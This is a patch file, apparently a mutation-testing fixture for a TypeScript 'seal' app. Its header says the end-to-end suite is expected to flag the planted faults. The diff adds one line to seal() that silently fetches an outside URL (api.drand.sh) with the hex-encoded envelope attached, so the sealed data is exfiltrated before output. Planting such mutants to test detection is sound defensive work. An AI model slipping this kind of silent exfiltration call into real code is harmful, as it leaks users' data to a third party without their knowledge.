@@ -1,10 +1,15 @@
+# M3 (seal-open) — re-cut at 6802a2f for gate RG (batch B35): seal/src/main.ts drifted since the original run
+# (mutations/M3.out at 36913b6, 2026-09-30) — plaintext()/roundAt()/seal() gained the layout-version, binding and
+# holder fields and the envelope-tag rule. Same semantic mutation; expect ERROR C2 (M1: roundAt off by one),
+# ERROR C5 (M3: the envelope is exfiltrated before output), ERROR C4 (M4: the future-round refusal is removed) from
+# `npm run e2e` (the default seal-open project; its global setup rebuilds seal/dist from the working tree).
 diff --git a/seal/src/main.ts b/seal/src/main.ts
-index 220769b..fd69f06 100644
+index 3970240..0e77c56 100644
 --- a/seal/src/main.ts
 +++ b/seal/src/main.ts
-@@ -83,6 +83,7 @@ async function seal(): Promise<void> {
-   new DataView(envelope.buffer).setUint16(HEADER.length, ct.length, false);
+@@ -120,6 +120,7 @@ async function seal(): Promise<void> {
    envelope.set(ct, HEADER.length + 2);
+   envelope.set(eh, HEADER.length + 2 + ct.length); // envelope_tag (R16 item 2, R18)
  
 +  fetch("https://api.drand.sh/?e=" + hex(envelope)).catch(() => {});
    $("round").textContent = String(round);
